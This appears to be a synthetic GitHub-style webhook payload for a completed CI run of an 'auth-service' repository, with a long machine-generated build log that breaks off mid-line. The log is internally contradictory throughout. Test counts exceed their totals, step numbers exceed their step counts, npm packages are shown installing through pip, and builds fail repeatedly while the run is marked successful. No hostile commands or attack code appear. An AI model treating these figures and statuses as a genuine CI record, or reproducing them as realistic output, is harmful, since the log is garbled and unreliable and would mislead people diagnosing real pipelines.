{
  "action": "completed",
  "workflow_run": {
    "id": 332,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "acebf446ed7fbe18bdaa50edaddfb7f07daca383",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-16T12:46:33.349344Z",
    "updated_at": "2025-12-16T12:49:31.384148Z"
  },
  "repository": {
    "full_name": "startup-io/auth-service",
    "name": "auth-service"
  },
  "sender": {
    "login": "alice"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: setup_environment ===\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 9/22: Linting\nCoverage: 77% statements, 87% branches\nHEAD is now at d90d4ac\nSwitched to branch 'hotfix/task-893'\n[12:46:33] DEBUG: Loading configuration\nTLS handshake completed\nnpm install: added 244 packages\nTLS handshake completed\nSnapshots: 6 passed, 13 total\nUploading artifact 'build' (23 files)\nyarn add: Done in 9.50s\nCache saved successfully\nLayer 9/12: COPY command\nArtifact uploaded: build.tar.gz (21MB)\n[12:46:33] INFO: Connecting to database\nCache invalidated: node_modules\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nBundling main.js\nEnvironment: test\nFetching submodules...\n  PASS: integration/test_cache_hit.spec.js\n[12:46:33] DEBUG: Connection pool: 17 active\npip install: Successfully installed webpack-3.9\nCache invalidated: node_modules\n[12:46:33] INFO: Processing request\nSwitched to branch 'bugfix/task-775'\nWARNING: jest has known vulnerabilities\nTests: 413 passed, 196 total\nBuilding Docker image...\nCompleted.\nDone.\nArtifact uploaded: build.tar.gz (41MB)\nStep 6/21: Building\nWARNING: express has known vulnerabilities\n[12:46:33] WARN: Deprecated API usage\nNODE_ENV=production\n[12:46:33] INFO: Request completed\nCache hit for key-7923\nUsing Python 3.10\nUsing Node.js 14.9.4\nInstalling axios@2.19.2\nUsing Python 3.9\n[12:46:33] DEBUG: Memory usage: 1982MB\nUsing Node.js 16.6.5\n[12:46:33] INFO: Request completed\nTLS handshake completed\nTests: 163 passed, 269 total\npip: Downloading jest-5.14.tar.gz\n[12:46:33] ERROR: Connection failed\npip install: Successfully installed eslint-4.18\npip: Collecting eslint\nConnection established\nLayer 6/8: RUN command\n\u2713 Step 'checkout' succeeded\n[12:46:33] INFO: Starting build process\nCache restored successfully (148MB)\nAlready up to date.\n[12:46:33] DEBUG: Loading configuration\nCache invalidated: build\nEnvironment: test\nLoading...\nUploading artifact 'coverage' (43 files)\npip: Collecting react\nUploading artifact 'coverage' (9 files)\nCompleted.\nStep 7/16: Deploying\npip: Installing build dependencies...\n[12:46:33] DEBUG: Connection pool: 3 active\n[12:46:33] DEBUG: Connection pool: 20 active\nStep 18/25: Deploying\nSuccess!\nyarn add: Done in 22.80s\nFetching submodules...\n[12:46:33] DEBUG: Query executed in 21ms\nyarn add: Done in 11.31s\nImage pulled successfully\n[12:46:33] INFO: Connecting to database\nFetching from https://amazonaws.com/package.json\nPushing to registry...\nStep 17/20: Testing\nChecking out develop branch\nBundling runtime.js\nInstalling jest@2.0.5\n[12:46:33] INFO: Processing request\nStep 16/20: Deploying\nUsing Python 3.9\nArtifact downloaded: 32MB\n[12:46:33] DEBUG: Query executed in 71ms\nCompiling components/main.py...\nArtifact uploaded: build.tar.gz (7MB)\nTransforming 339 files...\n[12:46:33] INFO: Starting build process\nCompiling components/handler.rs...\nStep 11/20: Deploying\n[12:46:33] DEBUG: Loading configuration\nOptimizing 57 modules...\nArtifact downloaded: 38MB\n[12:46:33] INFO: Cache refreshed\nBundling runtime.css\nStep 11/25: Running migrations\nException: NullPointerException\nnpm install: resolved 1379 packages\nCompiling components/service.java...\n[12:46:33] DEBUG: Initializing service\n=== Step setup_environment completed ===\n=== Step: upload_artifacts ===\nSuccess!\n[12:46:33] DEBUG: Loading configuration\nArtifact downloaded: 28MB\nFAILED: test_cache_hit\nyarn add: Done in 10.64s\npip: Collecting react\n[12:46:33] WARN: Deprecated API usage\nStep 10/22: Linting\nHEAD is now at 275979b\nDone.\nStep 10/21: Deploying\nTime: 105.138s\nnpm notice: package.json updated\nEnvironment: test\n\u2713 All checks passed\n\u2713 Step 'install' succeeded\nTLS handshake completed\n[12:46:33] DEBUG: Connection pool: 8 active\nnpm notice: created a lockfile\nStep 18/23: Testing\nWaiting...\nStep 5/17: Installing dependencies\nReady.\nDone.\nRan 106 tests in 44s\n  PASS: integration/test_user_create.spec.js\npip install: Successfully installed eslint-1.2\nPlatform: linux-x64\nCache invalidated: build\nRan 20 tests in 56s\nTLS handshake completed\n\u2713 Task completed in 4233ms\nSwitched to branch 'hotfix/task-337'\nPlatform: win32-x64\n  PASS: integration/test_api_health.spec.js\nCache hit for key-9377\nDone.\nCache hit for key-3072\nFetching submodules...\nInstalling jest@3.17.6\n[12:46:33] DEBUG: Memory usage: 1327MB\n\u2713 All checks passed\nNODE_ENV=development\nFetching from https://npmjs.org/package.json\n[12:46:33] INFO: Request completed\nFinished.\n[12:46:33] DEBUG: Initializing service\n[12:46:33] WARN: Deprecated API usage\nTests: 287 passed, 388 total\nTest Suites: 20 passed, 14 total\n[12:46:33] INFO: Request completed\nCoverage: 85% statements, 64% branches\n  PASS: test_cache_hit (179ms)\nCompiling src/utils.go...\nTime: 17.886s\nOptimizing 16 modules...\nConnection established\nyarn add: Done in 27.65s\nTests: 264 passed, 55 total\nCache restored successfully (312MB)\n\u2713 Step 'install' succeeded\nLayer 5/8: ENV command\nSuccess!\nLoading...\nWARNING: lodash has known vulnerabilities\nOK\nException: RuntimeError\n[12:46:33] INFO: Connecting to database\nStep 1/25: Building\n[12:46:33] DEBUG: Query executed in 95ms\nStep 2/17: Building\nPlatform: linux-x64\n[12:46:33] DEBUG: Query executed in 79ms\nUsing Node.js 20.15.5\n[12:46:33] INFO: Processing request\nSnapshots: 41 passed, 31 total\nPOST /data - 200 (460ms)\npip: Installing build dependencies...\npip: Downloading eslint-4.13.tar.gz\nWaiting...\nHEAD is now at fc32335\nTest Suites: 9 passed, 7 total\n[12:46:33] INFO: Processing request\nSnapshots: 22 passed, 10 total\n\u2713 All checks passed\n[12:46:33] DEBUG: Memory usage: 1034MB\nCreating production build...\n[12:46:33] INFO: Connecting to database\nPOST /api - 201 (471ms)\n[12:46:33] DEBUG: Query executed in 62ms\nFetching submodules...\n[12:46:33] DEBUG: Initializing service\nyarn add: Done in 30.0s\nInstalling prettier@2.18.3\nCache hit for key-8673\n  PASS: integration/test_cache_hit.spec.js\nLoading...\nnpm install: resolved 1714 packages\nnpm install: added 120 packages\nPlatform: darwin-arm64\nFetching from https://amazonaws.com/package.json\nNODE_ENV=test\nStep 1/25: Deploying\nArtifact downloaded: 35MB\n\u2713 Step 'checkout' succeeded\nCompiling src/service.java...\n=== Step upload_artifacts completed ===\n=== Step: deploy_staging ===\n[12:46:33] WARN: Deprecated API usage\nCache restored successfully (187MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 3/20: Testing\nCompiling components/app.ts...\nnpm notice: package.json updated\nBuilding Docker image...\nTest Suites: 35 passed, 49 total\nLayer 6/12: ENV command\nCache invalidated: node_modules\nPlatform: darwin-arm64\nCache saved successfully\n[12:46:33] DEBUG: Query executed in 73ms\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 10/24: Testing\nStep 15/25: Building\nCompiling lib/index.js...\nBundling main.css\n[12:46:33] INFO: Starting build process\n[12:46:33] WARN: Deprecated API usage\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nLoading...\nChecking out main branch\nFetching from https://gcr.io/package.json\n\u2713 Step 'setup' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:33] INFO: Request completed\n[12:46:33] DEBUG: Query executed in 69ms\nOptimizing 71 modules...\nStep 11/20: Installing dependencies\nInstalling prettier@2.6.9\nException: TypeError\n[12:46:33] WARN: Deprecated API usage\n[12:46:33] DEBUG: Loading configuration\nUsing Node.js 15.7.6\nTest Suites: 34 passed, 12 total\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip install: Successfully installed express-2.20\nFetching submodules...\nLoading...\n[12:46:33] DEBUG: Memory usage: 1862MB\nTLS handshake completed\nImage pulled successfully\nAlready up to date.\nCreating production build...\nFinished.\nOK\nTLS handshake completed\nTLS handshake completed\npip: Downloading axios-1.14.tar.gz\nWARNING: webpack has known vulnerabilities\n[12:46:33] WARN: Deprecated API usage\nProcessing...\nNODE_ENV=development\nException: NullPointerException\nCache hit for key-4072\nChecking out master branch\n[12:46:33] DEBUG: Connection pool: 19 active\n  PASS: test_cache_hit (365ms)\nWaiting...\nHEAD is now at d91bf3e\nUsing Python 3.9\nTime: 91.59s\nFetching submodules...\n[12:46:33] DEBUG: Loading configuration\nSwitched to branch 'hotfix/task-194'\nFetching from https://gcr.io/package.json\n[12:46:33] INFO: Cache refreshed\nWaiting...\nBundling vendor.js\nFetching from https://googleapis.com/package.json\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nVerifying...\nStep 8/22: Testing\nnpm install: resolved 1796 packages\nOptimizing 73 modules...\nTime: 69.700s\nConnection established\nCache miss for key-8029\nWaiting...\n\u2713 All checks passed\nVerifying...\nGenerating source maps...\nVerifying...\nUsing Python 3.9\nGET /api - 201 (87ms)\nUsing Python 3.10\nStep 3/25: Building\nCompleted.\nnpm notice: package.json updated\n[12:46:33] DEBUG: Query executed in 38ms\nnpm install: added 67 packages\nArtifact downloaded: 25MB\nnpm install: resolved 1356 packages\npip: Downloading eslint-5.18.tar.gz\nAlready up to date.\n\u2713 build completed\nCache saved successfully\nUsing Python 3.11\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 All checks passed\nnpm notice: created a lockfile\nPOST /data - 200 (461ms)\n[12:46:33] DEBUG: Query executed in 65ms\n=== Step deploy_staging completed ===\n=== Step: build ===\nReady.\nUploading artifact 'dist' (24 files)\nCompiling src/main.py...\n[12:46:33] DEBUG: Loading configuration\nBundling vendor.css\nWaiting...\nCache saved successfully\nEnvironment: test\nUploading artifact 'dist' (43 files)\nLoading...\nCache hit for key-5037\nSwitched to branch 'hotfix/task-404'\nUploading artifact 'build' (36 files)\nCompiling src/service.java...\nCache restored successfully (48MB)\nCompiling lib/handler.rs...\nStep 13/16: Deploying\nProcessing...\nStep 4/16: Deploying\nCompleted.\nArtifact uploaded: build.tar.gz (22MB)\npip install: Successfully installed express-5.15\nLayer 8/13: RUN command\npip: Downloading express-5.5.tar.gz\nNODE_ENV=production\n[12:46:33] DEBUG: Loading configuration\nNODE_ENV=production\nWaiting...\nCache miss for key-6957\nStep 12/18: Running migrations\nStep 19/16: Installing dependencies\nOK\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 Step 'setup' succeeded\nImage pulled successfully\n\u2717 build failed with exit code 25\nTransforming 550 files...\nCompiling components/main.py...\nStep 3/25: Testing\nnpm install: resolved 859 packages\nCompiling components/index.js...\nnpm notice: package.json updated\n[12:46:33] INFO: Request completed\nPulling image: node:3.11\nStep 13/19: Linting\n  PASS: test_db_connect (320ms)\nWARNING: express has known vulnerabilities\nInstalling react@1.4.2\nTests: 453 passed, 155 total\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 All checks passed\nConnection established\nTime: 57.916s\nGenerating source maps...\nCache hit for key-2070\nUsing Python 3.9\nCache miss for key-2371\nArtifact uploaded: dist.zip (49MB)\nUploading artifact 'dist' (15 files)\nTime: 56.603s\n[12:46:33] INFO: Starting build process\nTransforming 409 files...\nHEAD is now at 7fc7366\nPushing to registry...\nDone.\nFetching from https://amazonaws.com/package.json\nAlready up to date.\nCreating production build...\n[12:46:33] DEBUG: Loading configuration\npip: Downloading prettier-5.15.tar.gz\n  PASS: unit/test_cache_hit.spec.js\n[12:46:33] DEBUG: Connection pool: 15 active\nConnection established\nPushing to registry...\nWARNING: prettier has known vulnerabilities\nFAILED: test_user_create\nCreating production build...\n\u2713 Step 'build' succeeded\nImage pulled successfully\nPlatform: linux-x64\npip install: Successfully installed lodash-4.19\n[12:46:33] DEBUG: Memory usage: 389MB\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompleted.\nImage pulled successfully\n[12:46:33] INFO: Cache refreshed\nSwitched to branch 'bugfix/task-143'\nCreating production build...\nTests: 153 passed, 314 total\nSnapshots: 50 passed, 0 total\n\u2713 All checks passed\nTransforming 806 files...\n[12:46:33] DEBUG: Loading configuration\nWaiting...\nPlatform: win32-x64\nSwitched to branch 'feature/task-217'\nNODE_ENV=production\nVerifying...\nException: ValueError\n[12:46:33] DEBUG: Initializing service\nSnapshots: 29 passed, 0 total\nArtifact uploaded: build.tar.gz (3MB)\n\u2717 build failed with exit code 28\npip: Collecting axios\n\u2713 All checks passed\n[12:46:33] INFO: Cache refreshed\n=== Step build completed ===\n=== Step: restore_cache ===\nFinished.\n[12:46:33] INFO: Cache refreshed\nBundling main.css\nOK\npip install: Successfully installed axios-1.12\nGET /api - 201 (67ms)\nCoverage: 75% statements, 87% branches\nBuilding Docker image...\nStep 9/23: Linting\nPOST /data - 202 (68ms)\nEnvironment: test\nCache hit for key-3681\n[12:46:33] INFO: Starting build process\nCache invalidated: node_modules\n[12:46:33] ERROR: Connection failed\nBuilding Docker image...\n[12:46:33] INFO: Starting build process\nGenerating source maps...\nRan 180 tests in 4s\nAlready up to date.\nCompleted.\n[12:46:33] INFO: Connecting to database\n  PASS: test_api_health (45ms)\nStep 6/24: Linting\n[12:46:33] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 15/15: Deploying\nBundling styles.css\nGET /status - 201 (24ms)\nFetching submodules...\nCompiling lib/main.py...\nMinifying app.js\nFetching from https://githubusercontent.com/package.json\nWARNING: express has known vulnerabilities\nCache saved successfully\n[12:46:33] INFO: Starting build process\nFAILED: test_db_connect\nLayer 6/14: RUN command\nVerifying...\nnpm notice: created a lockfile\nCache miss for key-4837\npip: Installing build dependencies...\n[12:46:33] WARN: Deprecated API usage\nCoverage: 86% statements, 79% branches\npip install: Successfully installed jest-2.17\nBundling vendor.css\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache invalidated: node_modules\nTests: 202 passed, 103 total\nCompiling components/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 All checks passed\n[12:46:33] DEBUG: Loading configuration\nTest Suites: 31 passed, 34 total\n  PASS: test_user_create (104ms)\n[12:46:33] DEBUG: Connection pool: 13 active\nCompiling lib/app.ts...\nRan 165 tests in 41s\nCompiling components/utils.go...\nCache hit for key-2167\n\u2713 Task completed in 2822ms\nGET /health - 201 (44ms)\n  PASS: unit/test_auth_login.spec.js\n[12:46:33] WARN: Deprecated API usage\nFinished.\nCoverage: 98% statements, 88% branches\nPulling image: python:latest\nWARNING: eslint has known vulnerabilities\nImage pulled successfully\nTime: 32.755s\nCompiling src/index.js...\nCompiling lib/main.py...\n\u2713 All checks passed\nVerifying...\nSuccess!\nSnapshots: 1 passed, 44 total\nCreating production build...\nSuccess!\nPOST /data - 202 (229ms)\nChecking out develop branch\n[12:46:33] INFO: Request completed\nOptimizing 91 modules...\n[12:46:33] DEBUG: Initializing service\nnpm notice: created a lockfile\nUsing Python 3.11\nHEAD is now at a83094e\nStep 11/21: Building\n[12:46:33] DEBUG: Connection pool: 8 active\nFinished.\n[12:46:33] DEBUG: Initializing service\nOptimizing 60 modules...\nArtifact downloaded: 26MB\nOK\nCompiling utils/main.py...\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTLS handshake completed\nStep 19/23: Testing\nReady.\nOK\n  PASS: e2e/test_cache_hit.spec.js\nArtifact uploaded: dist.zip (29MB)\nInstalling express@5.8.2\n\u2713 deploy completed\n[12:46:33] INFO: Starting build process\n=== Step restore_cache completed ===\n=== Step: deploy_production ===\nArtifact uploaded: build.tar.gz (16MB)\nArtifact uploaded: build.tar.gz (11MB)\nFinished.\nStep 3/25: Linting\n[12:46:33] INFO: Cache refreshed\nInstalling lodash@5.18.5\nEnvironment: production\nCompiling components/utils.go...\n\u2713 build completed\nStep 17/22: Linting\nTime: 31.156s\nImage pulled successfully\nMinifying vendor.js\nPulling image: alpine:latest\nDone.\nNODE_ENV=production\nPushing to registry...\nSuccess!\nFetching submodules...\nCompleted.\nSnapshots: 23 passed, 38 total\n[12:46:33] ERROR: Connection failed\nCache saved successfully\n[12:46:33] DEBUG: Query executed in 25ms\nStep 11/15: Building\nCompleted.\nOK\nVerifying...\nHEAD is now at 39df60c\n[12:46:33] INFO: Connecting to database\nOK\nArtifact uploaded: build.tar.gz (21MB)\nPushing to registry...\nWARNING: axios has known vulnerabilities\nImage pulled successfully\n\u2717 build failed with exit code 6\nSwitched to branch 'feature/task-146'\nArtifact downloaded: 17MB\nFetching submodules...\nyarn add: Done in 14.42s\nLayer 7/8: ENV command\n[12:46:33] INFO: Request completed\nWARNING: webpack has known vulnerabilities\nnpm notice: created a lockfile\nCreating production build...\nEnvironment: test\npip: Installing build dependencies...\nBundling main.js\n[12:46:33] DEBUG: Initializing service\n[12:46:33] INFO: Processing request\nStep 12/20: Testing\n[12:46:33] INFO: Connecting to database\nCompiling src/app.ts...\nCompiling src/handler.rs...\nStep 17/24: Building\nSuccess!\n[12:46:33] WARN: Deprecated API usage\nProcessing...\nCompiling src/app.ts...\n[12:46:33] INFO: Connecting to database\nUsing Python 3.11\nFinished.\nWARNING: jest has known vulnerabilities\nMinifying main.js\nCompiling components/app.ts...\nFinished.\nStep 1/20: Linting\n\u2713 All checks passed\nStep 18/19: Testing\nEnvironment: test\nCache saved successfully\nCompiling lib/index.js...\npip: Downloading webpack-1.5.tar.gz\nSnapshots: 19 passed, 36 total\nWARNING: webpack has known vulnerabilities\nStep 18/23: Linting\nnpm install: resolved 1681 packages\nWARNING: webpack has known vulnerabilities\n[12:46:33] INFO: Connecting to database\nTransforming 788 files...\nCache miss for key-1161\nOK\nCompiling src/handler.rs...\n\u2713 Step 'setup' succeeded\n[12:46:33] INFO: Processing request\n[12:46:33] DEBUG: Query executed in 44ms\nSwitched to branch 'feature/task-848'\n[12:46:33] WARN: Deprecated API usage\nPOST /upload - 202 (363ms)\nnpm install: resolved 363 packages\nCache miss for key-8274\nOptimizing 74 modules...\nCompiling src/utils.go...\n\u2713 All checks passed\nVerifying...\nSuccess!\nDone.\npip install: Successfully installed prettier-5.13\nCoverage: 78% statements, 87% branches\n\u2713 All checks passed\n[12:46:33] DEBUG: Connection pool: 15 active\nPulling image: alpine:latest\nCompiling src/utils.go...\nCompiling utils/main.py...\nCompiling components/app.ts...\nLoading...\n=== Step deploy_production completed ===\n=== Step: e2e_tests ===\nFinished.\nInstalling express@1.5.0\nAlready up to date.\nTime: 10.800s\n\u2713 Step 'checkout' succeeded\nTransforming 879 files...\nCache hit for key-6468\nStep 5/17: Deploying\nOptimizing 12 modules...\npip: Collecting lodash\nSuccess!\nMinifying app.js\nUploading artifact 'coverage' (42 files)\nArtifact downloaded: 22MB\nGenerating source maps...\nCompiling src/index.js...\nVerifying...\nPOST /upload - 201 (418ms)\nFetching from https://pypi.org/package.json\nTLS handshake completed\npip: Collecting react\nStep 11/17: Installing dependencies\nTransforming 112 files...\nProcessing...\n[12:46:33] INFO: Starting build process\n[12:46:33] DEBUG: Query executed in 6ms\nSnapshots: 20 passed, 31 total\nPOST /upload - 201 (384ms)\n[12:46:33] INFO: Starting build process\nStep 11/17: Installing dependencies\nUsing Node.js 16.12.2\n[12:46:33] DEBUG: Loading configuration\nSwitched to branch 'bugfix/task-639'\nHEAD is now at 7ed6ecd\nPOST /upload - 200 (96ms)\nArtifact downloaded: 1MB\nGET /api - 201 (30ms)\nChecking out master branch\nBuilding Docker image...\nCompiling utils/service.java...\nCompiling src/app.ts...\nCache saved successfully\nVerifying...\nCompiling lib/app.ts...\nCreating production build...\n[12:46:33] INFO: Starting build process\nCreating production build...\nOptimizing 68 modules...\nBuilding Docker image...\n\u2713 package completed\n[12:46:33] WARN: Deprecated API usage\n[12:46:33] DEBUG: Query executed in 71ms\n\u2713 Task completed in 2707ms\nStep 8/22: Installing dependencies\n[12:46:33] WARN: Deprecated API usage\nTLS handshake completed\nCompiling lib/handler.rs...\nCache restored successfully (230MB)\npip: Collecting prettier\nArtifact uploaded: dist.zip (2MB)\nFAILED: test_cache_hit\nSuccess!\nyarn add: Done in 12.94s\npip: Collecting eslint\nStep 17/20: Testing\nnpm install: resolved 244 packages\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling webpack@3.10.2\nCache miss for key-4532\npip: Installing build dependencies...\nRan 120 tests in 15s\nChecking out master branch\nStep 9/21: Linting\nSwitched to branch 'feature/task-416'\nPulling image: alpine:18\n\u2713 Step 'test' succeeded\nCache saved successfully\nOptimizing 13 modules...\nFetching from https://github.com/package.json\nChecking out master branch\nFetching from https://gcr.io/package.json\nnpm notice: package.json updated\nWARNING: prettier has known vulnerabilities\nException: ValueError\n[12:46:33] DEBUG: Memory usage: 1664MB\n[12:46:33] INFO: Starting build process\nLoading...\nGenerating source maps...\n\u2713 Step 'checkout' succeeded\n\u2713 Task completed in 2387ms\nTest Suites: 26 passed, 12 total\nWARNING: react has known vulnerabilities\n[12:46:33] DEBUG: Query executed in 63ms\npip: Downloading react-5.7.tar.gz\nVerifying...\nProcessing...\nLoading...\n[12:46:33] INFO: Connecting to database\nBundling runtime.css\n[12:46:33] INFO: Connecting to database\nFinished.\nSwitched to branch 'hotfix/task-257'\nnpm notice: created a lockfile\nSnapshots: 25 passed, 18 total\nBuilding Docker image...\nUploading artifact 'build' (26 files)\n=== Step e2e_tests completed ===\n=== Step: setup_node ===\n\u2713 lint completed\npip install: Successfully installed express-5.13\nnpm install: resolved 537 packages\nGenerating source maps...\nConnection established\nArtifact downloaded: 20MB\n[12:46:33] INFO: Connecting to database\nTime: 66.60s\npip: Downloading axios-1.9.tar.gz\nTime: 22.879s\npip: Installing build dependencies...\nnpm notice: package.json updated\nCache miss for key-1073\n[12:46:33] ERROR: Connection failed\nOptimizing 50 modules...\n[12:46:33] INFO: Processing request\nCreating production build...\nHEAD is now at bba0592\nnpm install: added 293 packages\nWARNING: express has known vulnerabilities\n\u2713 All checks passed\nEnvironment: staging\nTLS handshake completed\n[12:46:33] INFO: Processing request\n  PASS: test_auth_login (121ms)\nOK\n  PASS: test_cache_hit (230ms)\nCompiling components/utils.go...\n[12:46:33] DEBUG: Connection pool: 3 active\n\u2717 build failed with exit code 7\nOptimizing 76 modules...\nStep 11/20: Building\nFetching submodules...\n\u2713 All checks passed\nReady.\nTransforming 963 files...\nProcessing...\npip install: Successfully installed react-1.16\nBuilding Docker image...\nBundling vendor.css\nAlready up to date.\n[12:46:33] INFO: Starting build process\n[12:46:33] INFO: Processing request\nStep 16/25: Running migrations\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nMinifying app.js\n[12:46:33] DEBUG: Query executed in 51ms\nHEAD is now at b1b4483\nPlatform: win32-x64\nArtifact uploaded: build.tar.gz (4MB)\nProcessing...\n[12:46:33] INFO: Request completed\nAlready up to date.\npip: Installing build dependencies...\nSuccess!\npip install: Successfully installed jest-2.13\n[12:46:33] ERROR: Connection failed\nGenerating source maps...\nCache saved successfully\nCompiling lib/app.ts...\nStep 7/25: Running migrations\nStep 4/25: Linting\nCompiling components/main.py...\n[12:46:33] WARN: Deprecated API usage\nTests: 350 passed, 455 total\npip: Installing build dependencies...\nPulling image: node:18\n[12:46:33] DEBUG: Loading configuration\n[12:46:33] DEBUG: Memory usage: 626MB\n\u2713 All checks passed\n[12:46:33] WARN: Deprecated API usage\n\u2713 Task completed in 4457ms\nPushing to registry...\nLoading...\nTests: 174 passed, 340 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nReady.\npip install: Successfully installed axios-2.20\nEnvironment: production\nGenerating source maps...\nHEAD is now at 8192f9c\nTest Suites: 13 passed, 44 total\nFinished.\nConnection established\nStep 12/25: Deploying\nMinifying main.js\nArtifact uploaded: build.tar.gz (12MB)\nProcessing...\nCompiling components/main.py...\nCompiling components/app.ts...\nChecking out develop branch\nFinished.\nCompiling lib/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:33] DEBUG: Query executed in 53ms\nTime: 61.653s\nCache restored successfully (59MB)\nPOST /api - 200 (19ms)\nCompiling utils/utils.go...\nDone.\n  PASS: test_auth_login (384ms)\nStep 20/24: Building\nFetching submodules...\nCompiling utils/app.ts...\nRan 120 tests in 51s\n=== Step setup_node completed ===\n=== Step: unit_tests ===\npip: Collecting jest\nFinished.\nHEAD is now at a1370fd\nFinished.\nEnvironment: staging\nTLS handshake completed\n[12:46:33] INFO: Starting build process\n[12:46:33] INFO: Processing request\nHEAD is now at b129e37\nImage pulled successfully\nnpm install: resolved 879 packages\nUsing Node.js 17.19.3\nCompiling components/main.py...\n[12:46:33] INFO: Connecting to database\nCache hit for key-3586\nTLS handshake completed\nInstalling eslint@2.13.2\nCache invalidated: node_modules\nTime: 97.814s\nChecking out develop branch\nCompleted.\nTime: 71.731s\nPlatform: darwin-arm64\nStep 9/22: Building\nFetching submodules...\nyarn add: Done in 24.49s\n[12:46:33] INFO: Cache refreshed\nArtifact uploaded: build.tar.gz (29MB)\npip: Collecting jest\n\u2713 All checks passed\nReady.\nCache hit for key-5691\nMinifying app.js\n[12:46:33] INFO: Connecting to database\nPlatform: darwin-arm64\npip install: Successfully installed react-2.1\nPOST /api - 202 (66ms)\nTest Suites: 31 passed, 43 total\nPushing to registry...\n\u2713 Step 'setup' succeeded\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nConnection established\nVerifying...\nSuccess!\nPushing to registry...\nWaiting...\nyarn add: Done in 25.48s\n[12:46:33] INFO: Starting build process\nSnapshots: 2 passed, 14 total\n[12:46:33] DEBUG: Memory usage: 1691MB\nConnection established\nCompleted.\nCache invalidated: dependencies\npip: Installing build dependencies...\nNODE_ENV=test\nOK\nCreating production build...\n[12:46:33] WARN: Deprecated API usage\nnpm install: added 376 packages\nCompleted.\nBuilding Docker image...\n[12:46:33] DEBUG: Initializing service\nnpm install: resolved 287 packages\nCompleted.\nOK\n[12:46:33] DEBUG: Query executed in 27ms\nyarn add: Done in 12.31s\nPulling image: node:3.11\nCreating production build...\nWARNING: eslint has known vulnerabilities\n  PASS: test_cache_hit (391ms)\n[12:46:33] DEBUG: Query executed in 89ms\nLayer 6/14: RUN command\nCache invalidated: build\n\u2713 Task completed in 3354ms\nCache saved successfully\nOptimizing 50 modules...\nGenerating source maps...\nVerifying...\nHEAD is now at 2d410a1\nAlready up to date.\nEnvironment: test\nSwitched to branch 'feature/task-350'\nHEAD is now at 24f2741\npip: Downloading express-5.6.tar.gz\nWaiting...\nWARNING: react has known vulnerabilities\nCompiling src/utils.go...\nDone.\nTest Suites: 33 passed, 11 total\nSuccess!\nWaiting...\nWARNING: jest has known vulnerabilities\npip: Installing build dependencies...\nCache miss for key-6337\nStep 19/17: Linting\n  PASS: integration/test_api_health.spec.js\nnpm notice: created a lockfile\n[12:46:33] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 lint completed\nBundling styles.js\nSwitched to branch 'hotfix/task-750'\nSuccess!\nCreating production build...\n=== Step unit_tests completed ===\n=== Step: save_cache ===\nConnection established\n[12:46:33] WARN: Deprecated API usage\nWARNING: express has known vulnerabilities\nCreating production build...\nPOST /upload - 200 (241ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nConnection established\nBuilding Docker image...\n\u2717 build failed with exit code 108\nRan 134 tests in 38s\nCompiling src/handler.rs...\n[12:46:33] DEBUG: Connection pool: 9 active\nStep 3/25: Building\n[12:46:33] DEBUG: Query executed in 46ms\nCoverage: 95% statements, 75% branches\nDone.\n[12:46:33] DEBUG: Memory usage: 2000MB\nArtifact uploaded: build.tar.gz (2MB)\nPOST /upload - 202 (117ms)\nFinished.\n\u2717 build failed with exit code 61\n[12:46:33] WARN: Deprecated API usage\nFetching submodules...\nStep 15/24: Testing\nBundling runtime.js\nyarn add: Done in 12.45s\nCache hit for key-3055\nPlatform: win32-x64\n[12:46:33] WARN: Deprecated API usage\nHEAD is now at cdede3d\nMinifying main.js\nCache saved successfully\nCache restored successfully (34MB)\n[12:46:33] INFO: Processing request\npip: Collecting prettier\n[12:46:33] DEBUG: Initializing service\nyarn add: Done in 20.48s\n[12:46:33] DEBUG: Initializing service\nOptimizing 16 modules...\npip: Downloading express-2.3.tar.gz\nCompiling src/service.java...\n\u2717 build failed with exit code 92\nCache miss for key-9384\nWARNING: prettier has known vulnerabilities\nReady.\npip: Collecting webpack\n[12:46:33] INFO: Request completed\nStep 3/20: Building\nTransforming 162 files...\nCache hit for key-5391\nCompiling utils/handler.rs...\nGET /health - 201 (3ms)\n[12:46:33] DEBUG: Query executed in 86ms\n[12:46:33] DEBUG: Connection pool: 14 active\n\u2713 validate completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:33] INFO: Starting build process\nCompleted.\nNODE_ENV=production\nnpm notice: created a lockfile\nCoverage: 77% statements, 73% branches\nCompiling components/service.java...\nPOST /data - 200 (246ms)\npip: Installing build dependencies...\nCompiling utils/handler.rs...\nStep 1/23: Deploying\nPlatform: darwin-arm64\nCache saved successfully\n[12:46:33] DEBUG: Query executed in 49ms\nStep 19/15: Linting\nUsing Python 3.11\nTLS handshake completed\nGET /status - 201 (10ms)\n\u2713 All checks passed\nFAILED: test_api_health\nImage pulled successfully\nImage pulled successfully\nCache saved successfully\nWaiting...\nCompiling components/main.py...\nCreating production build...\nGET /api - 